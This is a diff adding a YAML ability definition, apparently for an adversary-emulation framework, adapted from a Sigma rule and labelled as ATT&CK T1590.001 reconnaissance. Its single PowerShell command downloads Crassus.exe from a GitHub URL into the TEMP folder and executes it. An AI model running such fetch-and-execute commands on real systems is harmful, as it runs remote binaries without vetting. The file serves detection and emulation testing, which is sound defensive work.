@@ -1,0 +1,24 @@
+- requirements: []
+  technique_name: 'Gather Victim Network Information: Domain Properties'
+  technique_id: T1590.001
+  tactic: reconnaissance
+  name: Crassus Execution
+  description: 'Adapted from a Sigma rule. '
+  delete_payload: true
+  executors:
+  - cleanup: []
+    timeout: 60
+    platform: windows
+    name: psh
+    payloads: []
+    parsers:
+    - module: plugins.atomic.app.parsers.atomic_powershell
+      parserconfigs:
+      - source: validate_me
+        edge: ''
+        target: ''
+    command: 'Invoke-WebRequest -Uri "https://github.com/vu-ls/Crassus/raw/main/binaries/Crassus.exe"
+      -OutFile "$env:TEMP\Crassus.exe"
+
+      Start-Process -FilePath "$env:TEMP\Crassus.exe"'
+  id: 7e221240-8a9d-4012-96b5-552e9219c8a3
